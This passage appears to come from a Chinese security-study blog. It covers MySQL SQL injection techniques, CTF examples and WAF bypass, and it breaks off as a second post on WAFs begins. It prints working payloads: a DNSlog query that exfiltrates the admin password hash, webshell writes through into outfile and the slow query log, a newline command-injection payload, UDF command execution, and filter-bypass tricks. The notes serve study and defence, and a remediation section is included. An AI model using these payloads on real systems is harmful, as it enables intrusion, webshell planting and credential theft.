class="line">\\xxxx\xx</span><br></pre></td></tr></table></figure><p>   <img src="/../images/image-20230425175525555.png" alt="image-20230425175525555"></p><p>   <img src="/../images/image-20230425175452805.png" alt="image-20230425175452805"></p></li></ol><h5 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h5><ul><li>windows系统</li><li><code>secure_file_priv</code>为空</li></ul><h5 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,load_file(CONCAT(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">SELECT</span> hex(passwd) <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> LIMIT <span class="number">1</span>),<span class="string">&#x27;.mysql.2fzz61.dnslog.cn\\abc&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Hex编码的目的是减少干扰，域名有一定的规范，有些特殊字符不能带入</span></span><br><span class="line"><span class="comment">-- \\\\转义  →  \\</span></span><br></pre></td></tr></table></figure><h3 id="SMB外带注入"><a href="#SMB外带注入" class="headerlink" title="SMB外带注入"></a>SMB外带注入</h3><p><a href="http://www.moonslow.com/article/smb_sql_injection">http://www.moonslow.com/article/smb_sql_injection</a></p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><h5 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h5><p>宽字节：如果一个字符的大小是两个字节的，该字符称为宽字节字符</p><p><code>PHP</code>与<code>Mysql</code>之间的交互</p><p><img src="/../images/5917903e25c36c63ec29ad5237c2f7a4.png" alt="img"></p><p>将php的sql语句以<code>character_set_client</code>编码（也就是转为16进制数），再将16进制数以<code>character_set_connection</code>进行编码（也就是转换为url编码），然后以内部操作字符集进行url解码，最后以<code>character_set_results</code>编码输出结果。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">%df%<span class="number">27</span> 浏览器url自动解码===&gt; β<span class="string">&#x27; 转义===&gt;β\&#x27;转为16进制===&gt; 0xdf0x5c0x27 转换为url编码===&gt; %df%5c%27 进行url解码(因为是GBK编码，%df和%5c结合为汉字)===&gt; 運&#x27;</span></span><br></pre></td></tr></table></figure><p>简单的说就是通过宽字节吃掉转义符，逃逸出单引号来进行闭合</p><h5 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h5><p><code>sql-lab less-32</code></p><p>转义字符</p><p><img src="/../images/image-20230522170722857.png" alt="image-20230522170722857"></p><p>设置编码集</p><p><img src="/../images/image-20230522170750335.png" alt="image-20230522170750335"></p><p>sql语句，单引号闭合</p><p><img src="/../images/image-20230522171701503.png" alt="image-20230522171701503"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522171728569.png" alt="image-20230522171728569"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span>%df%<span class="number">27</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522171841053.png" alt="image-20230522171841053"></p><h5 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1%df&#x27;</span><br></pre></td></tr></table></figure><p>使用 Linux 自带的 iconv 命令进行 UTF 的编码转换</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo \&#x27;|iconv -f utf-8 -t utf-16</span><br><span class="line">echo \&#x27;|iconv -f utf-8 -t utf-32</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523121013028.png" alt="image-20230523121013028"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1�&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523121159948.png" alt="image-20230523121159948"></p><h3 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order by 注入"></a>order by 注入</h3><p><a href="https://www.cnblogs.com/1ink/p/15107674.html">https://www.cnblogs.com/1ink/p/15107674.html</a></p><ul><li><p>知道列名的前提下使用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?order=if(表达式,id,username)</span><br></pre></td></tr></table></figure></li><li><p>不知道列名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?order=if(表达式,1,(select id from information_schema.tables))</span><br></pre></td></tr></table></figure></li></ul><h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><h5 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h5><h6 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h6><ul><li><p>高权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select user, file_priv from mysql.user; </span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230528210141344.png" alt="image-20230528210141344"></p></li><li><p>知道网站的绝对路径</p></li><li><p><code>secure_fil_priv</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select @@secure_file_priv;</span><br><span class="line">show global variables like &#x27;%secure_file_priv%&#x27;; # show语句要堆叠注入和回显</span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/image-20230522174929267.png" alt="image-20230522174929267"></p><h6 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h6><p><strong>基于联合查询</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select *from users where id=1 union select 1,&#x27;&lt;?php phpinfo();?&gt;&#x27;,3 into outfile &#x27;C:\info.php&#x27;;</span><br><span class="line"></span><br><span class="line">select *from users where id=1 union select 1,&#x27;&lt;?php phpinfo();?&gt;&#x27;,3 into  dumpfile &#x27;C:\info2.php&#x27;;</span><br></pre></td></tr></table></figure><p><code>outfile</code>和<code>dumpfile</code>的区别</p><ul><li><code>outfile</code>导出数据支持多行，<code>dumpfile</code>只支持一行</li><li><code>outfile</code>会对数据进行转义，<code>dumpfile</code>不会</li></ul><p>所以使用<code>into dumpfile</code>这个函数来写入二进制文件</p><p><img src="/../images/image-20230522180009679.png" alt="image-20230522180009679"></p><p><strong>非联合查询</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select *from users where id=1 into outfile &#x27;C:\info.php&#x27; fields terminated by &#x27;&lt;?php phpinfo();?&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">select *from users where id=1 into outfile &#x27;C:\info2.php&#x27; lines terminated by &#x27;&lt;?php phpinfo();?&gt;&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522180543767.png" alt="image-20230522180543767"></p><h5 id="写入日志文件"><a href="#写入日志文件" class="headerlink" title="写入日志文件"></a>写入日志文件</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># --查看配置，日志是否开启，和mysql默认log地址(记下原地址方便恢复)</span><br><span class="line">show variables like &#x27;%general%&#x27;;</span><br><span class="line"></span><br><span class="line">set global general_log = on;</span><br><span class="line"></span><br><span class="line">set global general_log_file = &#x27;e:\info.php&#x27;; # 这里日志创建权限要低一些，不能在c盘创建</span><br><span class="line"></span><br><span class="line">select &#x27;&lt;?php phpinfo();?&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">--结束后，痕迹清理</span><br></pre></td></tr></table></figure><p>日志慢查询</p><p>From：<a href="https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html">https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html</a></p><blockquote><p>为什么要用慢查询写呢？因为开启日志监测后文件会很大，网站访问量大的话我们写的shell会出错</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;%slow_query_log%&#x27;;--查看慢查询信息</span><br><span class="line">set global slow_query_log=1;--启用慢查询日志(默认禁用)</span><br><span class="line">set global slow_query_log_file=&#x27;C:\\phpStudy\\WWW\\shell.php&#x27;;--修改日志文件路径</span><br><span class="line"></span><br><span class="line">show global variables like &#x27;%long_query_time%&#x27;;</span><br><span class="line">--查看默认时间值，当sql语句执行时间超过该值才会被计入日志中，默认10秒</span><br><span class="line"></span><br><span class="line">select &#x27;&lt;?php @eval($_POST[abc]);?&gt;&#x27; or sleep(@@long_query_time+1);--写shell到慢查询日志</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522182142555.png" alt="image-20230522182142555"></p><h5 id="sqlmap-–os-shell"><a href="#sqlmap-–os-shell" class="headerlink" title="sqlmap  –os-shell"></a>sqlmap  –os-shell</h5><ul><li><p>大致流程</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取目标信息→使用lines terminated by将具有文件上传的🐎上传到网站→逐级目录访问找到🐎</span><br><span class="line"></span><br><span class="line">→通过该🐎上传真正的命令🐎→测试命令🐎能否执行→删除上传的两个🐎</span><br></pre></td></tr></table></figure></li><li><p>文件上传🐎：form表单</p></li><li><p>php命令马：获得<code>disable_function</code>，遍历所有代码执行，命令执行函数，判断哪一个不在<code>disable_function</code>。</p></li></ul><h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><h5 id="load-file"><a href="#load-file" class="headerlink" title="load_file"></a><code>load_file</code></h5><p><strong>注意：转义字符</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select load_file(&#x27;e:\test.txt&#x27;); # \t 错误路径</span><br><span class="line">select load_file(&#x27;e:\\test.txt&#x27;);# 正确</span><br><span class="line">select load_file(0x653A5C746573742E747874);# 支持十六进制</span><br><span class="line">select load_file(char(101,58,92,116,101,115,116,46,116,120,116));# 支持char函数</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523134023401.png" alt="image-20230523134023401"></p><h5 id="load-data"><a href="#load-data" class="headerlink" title="load data "></a><code>load data </code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table user(cmd text)</span><br><span class="line">load data infile &#x27;e:/test.txt&#x27; into table user;</span><br><span class="line">select * from user;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523134532606.png" alt="image-20230523134532606"></p><p><img src="/../images/image-20230522220456619.png" alt="image-20230522220456619"></p><h3 id="mysqldump–数据库导出时的RCE"><a href="#mysqldump–数据库导出时的RCE" class="headerlink" title="mysqldump–数据库导出时的RCE"></a>mysqldump–数据库导出时的RCE</h3><p><strong>shell</strong>下执行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysqldump -uroot -proot --all-databases &gt; file_path  # 导出所有数据库</span><br><span class="line">mysqldump -uroot -proot --databases db1 --tables a1 a2  &gt; /file_path # 导出db1中的a1、a2表</span><br></pre></td></tr></table></figure><p>导出的文本内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">创建数据库判断语句-删除表-创建表-锁表-禁用索引-插入数据-启用索引-解锁表</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230528204837541.png" alt="image-20230528204837541"></p><p><strong>例题</strong></p><p>CISCN2023初赛–dumpit</p><p>关键代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$black</span> = <span class="string">&#x27;;`*#^$&amp;|&#x27;</span>;  <span class="comment">#黑名单</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$db</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;db&#x27;</span>];</span><br><span class="line"><span class="variable">$t2d</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;table_2_dump&#x27;</span>];</span><br><span class="line"><span class="variable">$randstr</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line"></span><br><span class="line"><span class="variable">$dump</span>=<span class="string">&#x27;mariadb-dump &#x27;</span>.<span class="variable">$db</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$t2d</span>.<span class="string">&#x27; &gt;./log/&#x27;</span>.<span class="variable">$randstr</span>.<span class="string">&#x27;.log&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$dump</span>);</span><br></pre></td></tr></table></figure><p>db和table都可控，过滤不严谨，并且直接拼接到命令中，造成RCE</p><p>payload</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?db=ctf&amp;table_2_dump=flag2 %0d%0a cmd</span><br></pre></td></tr></table></figure><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><strong>UDF提权</strong></p><blockquote><p>UDF（User Define Function）自定义函数，是数据库功能的一种扩展。用户通过自定义函数可以实现在 MySQL 中无法方便实现的功能，其添加的新函数都可以在 SQL 语句中调用，就像调用本机函数 version () 等方便。</p></blockquote><p>UDF制作：<a href="https://www.t00ls.com/thread-46107-1-1.html">Mysql_UDF_BackDoor开发实践 - 程序代码学习(Learning Program) - T00ls | 低调求发展 - 潜心习安全</a></p><p>UDF提权流程</p><p>工具：<a href="https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php">tools&#x2F;大马&#x2F;udf.php at master · echohun&#x2F;tools (github.com)</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 找到mysql的插件目录(安装目录下的lib/plugin/)</span></span><br><span class="line">show variables like <span class="string">&#x27;%plugin%&#x27;</span>; <span class="comment"># 返回插件目录</span></span><br><span class="line">select @@basedir; <span class="comment"># 返回安装目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入动态链接库</span></span><br><span class="line">sqlmap写入</span><br><span class="line">手动十六进制写入</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建自定义函数并调用命令</span></span><br><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME <span class="string">&#x27;udf.dll&#x27;</span>; <span class="comment"># 创建sys_eval函数</span></span><br><span class="line">select sys_eval(<span class="string">&#x27;whoami&#x27;</span>); <span class="comment"># 执行whoami命令</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除自定义函数</span></span><br><span class="line">drop <span class="keyword">function</span> sys_eval;</span><br></pre></td></tr></table></figure><p><strong>MOF提权</strong></p><ul><li>Windows Server 2003 </li><li>C:&#x2F;Windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F; 目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行</li></ul><h1 id="Mysql绕过补充"><a href="#Mysql绕过补充" class="headerlink" title="Mysql绕过补充"></a>Mysql绕过补充</h1><h3 id="通用绕过"><a href="#通用绕过" class="headerlink" title="通用绕过"></a>通用绕过</h3><ul><li><p>大小写绕过</p><p>修复：正则<code>/i</code></p></li><li><p>双写绕过（waf将关键字替换为空，且次数为1）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uniunionon</span><br></pre></td></tr></table></figure><p>修复：正则<code>/m</code></p></li></ul><h3 id="注释符绕过"><a href="#注释符绕过" class="headerlink" title="注释符绕过"></a>注释符绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 手动闭合</span><br><span class="line">$sql=&quot;select * from users where id=&#x27;$id&#x27;;&quot;</span><br><span class="line"></span><br><span class="line">$id=1&#x27; and &#x27;1&#x27;=&#x27;2</span><br><span class="line"></span><br><span class="line">select * from users where id=&#x27;1&#x27; and &#x27;1&#x27;=&#x27;2&#x27;;</span><br></pre></td></tr></table></figure><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><ul><li><p><code>%0a</code></p></li><li><p><code>%0d%0a</code></p></li><li><p><code>/**/</code></p></li><li><p>括号绕过</p><blockquote><p>在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p></blockquote><p><img src="/../images/image-20230522161003063.png" alt="image-20230522161003063"></p></li></ul><h3 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h3><h4 id="不让用单引号"><a href="#不让用单引号" class="headerlink" title="不让用单引号"></a>不让用单引号</h4><p>可以用十六进制代替</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">where(table_name=&#x27;users&#x27;) → where(table_name=0x7573657273)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522163358530.png" alt="image-20230522163358530"></p><h4 id="转义了单引号"><a href="#转义了单引号" class="headerlink" title="转义了单引号"></a>转义了单引号</h4><p>宽字节注入，二次注入</p><h3 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">concat(&quot;str1&quot;, &quot;,&quot; ,&quot;str2&quot;)</span><br><span class="line"></span><br><span class="line">concat_ws(&quot;,&quot; , &quot;str1&quot; , &quot;str2&quot;)</span><br><span class="line"></span><br><span class="line">group_concat(&quot;str1&quot;, &quot;,&quot; ,&quot;str2&quot;)</span><br></pre></td></tr></table></figure><h3 id="select绕过"><a href="#select绕过" class="headerlink" title="select绕过"></a>select绕过</h3><ul><li><p>已知表名可以用<code>handle</code></p></li><li><p>版本&gt;&#x3D;8.0</p><p><a href="https://blog.csdn.net/rfrder/article/details/118726022">mysql 8.0.21以上版本的新特性</a></p></li><li><p>在对当前表的列名注入时，可以直接写字段名，而无需<code>select 该字段 from 该表</code></p><p><img src="/../images/image-20230522161753632.png" alt="image-20230522161753632"></p></li></ul><h3 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substr(databse(),1,1) 等价于 substr(databse() from 1 for 1)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1,2,3; 等价于 select * from (select 1)a join (select 2)b join (select 3)c;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220718092241142.png" alt="image-20220718092241142"></p><h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 如果加了!就会执行在/* */内的语句</span><br><span class="line">/*!union select 1,2*/</span><br><span class="line"></span><br><span class="line"># 要将整个语句写入/* */内</span><br><span class="line">/*!union select */1,2 这是错误的</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#  version 5.7.26</span><br><span class="line">/*!00000 select 1,2*/; 可以</span><br><span class="line">/*!50726 select 1,2*/;  可以</span><br><span class="line">/*!50727 select 1,2*/;  不可以</span><br><span class="line"></span><br><span class="line">00000 到 50726之间是可以的</span><br></pre></td></tr></table></figure><h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h3><h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4><p><code>information_schem</code>被过滤，不知道表的字段名</p><h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>通过<code>select 数字</code>将字段名设置为数字</p><p><img src="/../images/image-20230523141619236.png" alt="image-20230523141619236"></p><p>再用联合查询将需要的数据存到上图的表中</p><p><img src="/../images/image-20230523141701416.png" alt="image-20230523141701416"></p><p>那么想要查询<code>users</code>表中的<code>username</code>字段的值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select `2` from (select 1,2,3 union select * from user)别名;</span><br><span class="line"></span><br><span class="line"># 别名是(select 1,2 union select * from user)返回的表的别名</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523141936080.png" alt="image-20230523141936080"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 如果反引号被过滤</span><br><span class="line">select group_concat(b) from (select 1,2 as b,3 union select * from users)a;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523142119240.png" alt="image-20230523142119240"></p><h1 id="预编译问题"><a href="#预编译问题" class="headerlink" title="预编译问题"></a>预编译问题</h1><h2 id="预编译失效"><a href="#预编译失效" class="headerlink" title="预编译失效"></a>预编译失效</h2><p><code>PHP-PDO</code>采用本地预处理</p><p><img src="/../images/image-20230330172825283.png" alt="image-20230330172825283"></p><p>传入<code>?username=&#39;admin&#39;</code>,查看日志如下</p><blockquote><p>开启永久日志,在配置文件中加入</p><p>general_log &#x3D; 1<br>general_log_file &#x3D; 日志路径</p></blockquote><p><img src="/../images/image-20230330172741664.png" alt="image-20230330172741664"></p><p>可以看到预编译为其自动添加了一对引号，并将用户输入的引号进行转义。</p><p>那么如果将表名，<code>order by xx</code>处进行预编译就会产生如下效果</p><p><img src="/../images/image-20230330001720031.png" alt="image-20230330001720031"></p><p><img src="/../images/image-20230330001733787.png" alt="image-20230330001733787"></p><p>可以看到这些语句”失效了”（没有得到想要的结果），所以在实际开发中，对于这些语句大概率就是进行一个拼接处理，就很可能存在sql注入。</p><h2 id="预编译使用错误"><a href="#预编译使用错误" class="headerlink" title="预编译使用错误"></a>预编译使用错误</h2><ul><li><p><a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html">ThinkPHP5 SQL注入漏洞 &amp;&amp; PDO真&#x2F;伪预处理分析 | 离别歌</a></p></li><li><p>堆叠注入</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>= <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment"># 预处理语句</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;select * from users where id=<span class="subst">$id</span>&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="variable">$fraction</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$fraction</span>);</span><br></pre></td></tr></table></figure><p>使用模拟预编译，并且没有绑定参数</p><p>又因为PDO默认可以支持多条SQL执行，所有造成了堆叠注入。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1;create database pdo;</span><br></pre></td></tr></table></figure><p>  <img src="/../images/image-20230523131701820.png" alt="image-20230523131701820"></p><h1 id="SqlMap学习"><a href="#SqlMap学习" class="headerlink" title="SqlMap学习"></a>SqlMap学习</h1><p>sqlmap 源码分析</p><p><img src="/../images/routine.png" alt="img"></p><ul><li><p><a href="https://www.anquanke.com/post/id/262848">sqlmap 项目剖析1</a></p></li><li><p><a href="https://www.anquanke.com/post/id/262847">sqlmap 项目剖析2</a></p></li><li><p><a href="https://www.anquanke.com/post/id/262849">sqlmap 项目剖析3</a></p><p>sqlmap 使用一种极其巧妙的方式组合生成一个完整的 payload，一个完整的 payload 由如下几个部分组成：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">prefix</span>&gt;</span> <span class="tag">&lt;<span class="name">test</span>&gt;</span> <span class="tag">&lt;<span class="name">comment</span>&gt;</span> <span class="tag">&lt;<span class="name">suffix</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中 prefix、comment、suffix 作为 boundary，boundary 用于闭合注入点的前后部分；test 则是最终如果闭合成功后必然执行的语句。</p><p>因此 sqlmap 将 prefix 与 suffix 单独作为 boundaries 保存，而 test 和 comment 则根据注入方式和数据库的不同被划分为六个文件（路径：<code>/data/xml/payloads</code>）</p><p><img src="/../images/t01d7dbc46705981404.jpg" alt="img"></p></li><li><p><a href="https://www.anquanke.com/post/id/262850">sqlmap 项目剖析4</a></p><p>布尔注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先发送一个 false 请求，如果结果与原页面相同就判断不存在布尔注入</span><br><span class="line">如果不相同发送一个 true 请求,如果与原页面相似</span><br><span class="line">则再发送一个 false 请求，然后把这两次返回的结果取差集，计算出True时的flag标识，也就是sqlmap的-string参数</span><br></pre></td></tr></table></figure><p>报错注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">发送报错payload，如果能够正则匹配到则说明存在报错注入。</span><br></pre></td></tr></table></figure><p>延时注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先发送N个正常请求，然后计算这N个请求响应时间的标准差和正常请求的最长响应时间</span><br><span class="line">然后发送一个延时请求，判断是否在区间内</span><br></pre></td></tr></table></figure><p>联合查询注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用order by和二分法来判断列数</span><br><span class="line">  遍历列数判断哪一列是回显点</span><br><span class="line">  发送payload</span><br></pre></td></tr></table></figure></li><li><p><a href="https://www.beysec.com/security/sqlmap-source-1.html">sqlmap源码分析与学习</a></p></li><li><p><a href="https://www.processon.com/view/5835511ce4b0620292bd7285">sqlmap 流程脑图</a></p></li></ul><p>os-shell 原理</p><ul><li><a href="https://xz.aliyun.com/t/7942">sqlmap –os-shell原理</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzIyMjkzMzY4Ng==&mid=2247485339&idx=1&sn=ea76ee0d56b8a95a118a60d111d48160">Sqlmap之os-shell原理分析</a></li></ul><p>攻防</p><ul><li><a href="https://xz.aliyun.com/t/10385">实战sqlmap绕过WAF</a></li><li><a href="https://www.anquanke.com/post/id/261915">sqlmap –os-shell反制小思路</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&mid=2247494179&idx=1&sn=e6c94b87981fda009e7be50c9eb73bf6">入侵检测之sqlmap恶意流量分析</a></li></ul><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><ul><li><p>正确使用预编译+黑名单</p></li><li><p>配置问题</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  站库分离</span><br><span class="line">  不允许外连</span><br><span class="line">  数据库以低权限运行</span><br><span class="line">  不显示报错</span><br><span class="line">  不使用多语句查询</span><br><span class="line">  secure_file_priv=NULL</span><br><span class="line">字符集保持一致</span><br></pre></td></tr></table></figure></li></ul><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.anquanke.com/post/id/98096">Dnslog在SQL注入中的实战-安全客 - 安全资讯平台</a></p><p><a href="https://cloud.tencent.com/developer/article/1938545">https://cloud.tencent.com/developer/article/1938545</a></p><p><a href="https://forum.butian.net/share/1559">奇安信攻防社区-SQL注入&amp;预编译</a></p><p><a href="https://xz.aliyun.com/t/3950">PDO场景下的SQL注入探究 - 先知社区</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WAF绕过学习</title>
      <link href="/2023/06/26/Waf%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/06/26/Waf%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="知己知彼"><a href="#知己知彼" class="headerlink" title="知己知彼"></a>知己知彼</h1><p><a href="https://www.cnblogs.com/realjimmy/p/12937247.html">WAF功能介绍（入门扫盲篇） - 一觉醒来写程序 - 博客园</a></p><h2 id="WAF的工作流程"><a href="#WAF的工作流程" class="headerlink" title="WAF的工作流程"></a>WAF的工作流程</h2><ul><li><p><strong>预处理</strong></p><ul><li><p>网络层过滤：IP黑白名单</p><blockquote><p>由于HTTP是应用层的协议，每次WAF都要解析它，会造成很大性能损耗。而对于某些经常发恶意请求的IP或进行CC攻击的IP，如果能够在网络层就把它们拦截了，对WAF性能是有很大的提升。</p></blockquote></li><li><p>应用层过滤：在接收到数据请求流量时会先判断是否为HTTP&#x2F;HTTPS请求，之后会查看此URL请求是否在白名单之内，如果该URL请求在白名单列表里，直接交给后端Web服务器进行响应处理，对于不在白名单之内的对数据包解析后进入到规则检测部分。</p></li></ul></li><li><p><strong>规则检测</strong></p><p>解析后的数据包会进入到检测体系中进行规则匹配，检查该数据请求是否符合规则，识别出恶意攻击行为。</p></li><li><p><strong>处理模块</strong></p><p>针对不同的检测结果，处理模块会做出不同的安全防御动作，如果符合规则则交给后端Web服务器进行响应处理，对于不符合规则的请求会执行相关的阻断、记录、告警处理。</p></li><li><p><strong>日志记录</strong></p><p>WAF在处理的过程中也会将拦截处理的日志记录下来，方便用户在后续中可以进行日志查看分析。</p></li></ul><h2 id="WAF分类"><a href="#WAF分类" class="headerlink" title="WAF分类"></a>WAF分类</h2><p><img src="/../images/image-20230516142728508.png" alt="image-20230516142728508"></p><p>本文以安全狗为例子进行简单学习</p><h2 id="WAF部署位置"><a href="#WAF部署位置" class="headerlink" title="WAF部署位置"></a>WAF部署位置</h2><p><img src="/../images/2015081104292360563.png" alt="enter image description here"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请求 → CDN → 云waf → 硬waf → WEB服务器 → 软waf → WEB应用程序（代码waf） → (数据库)</span><br></pre></td></tr></table></figure><h1 id="储备知识"><a href="#储备知识" class="headerlink" title="储备知识"></a>储备知识</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">waf了解</span><br><span class="line">编码和编程语言函数</span><br><span class="line">http协议</span><br><span class="line">web服务器特性</span><br><span class="line">互联网标准文档RFC</span><br></pre></td></tr></table></figure><h1 id="常见绕过手法"><a href="#常见绕过手法" class="headerlink" title="常见绕过手法"></a>常见绕过手法</h1><p><img src="/../images/QQ%E6%88%AA%E5%9B%BE20231017125131.jpg" alt="QQ截图20231017125131"></p><h2 id="迂回作战类"><a href="#迂回作战类" class="headerlink" 